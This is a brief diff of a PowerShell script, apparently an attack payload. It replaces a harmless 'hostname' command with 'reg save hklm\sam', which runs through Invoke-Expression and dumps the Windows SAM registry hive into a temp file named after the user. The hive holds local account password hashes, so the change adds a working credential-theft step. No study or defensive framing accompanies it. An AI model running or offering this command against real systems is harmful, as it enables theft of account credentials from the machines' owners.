@@ -1,5 +1,5 @@
 $FileName = "$env:tmp/$env:USERNAME-SAM-$(get-date -f yyyy-MM-dd_hh-mm ).txt"
-$regCommand = "hostname > $FileName"
+$regCommand = "reg save hklm\sam $FileName"
 Invoke-Expression -Command $regCommand
 
 
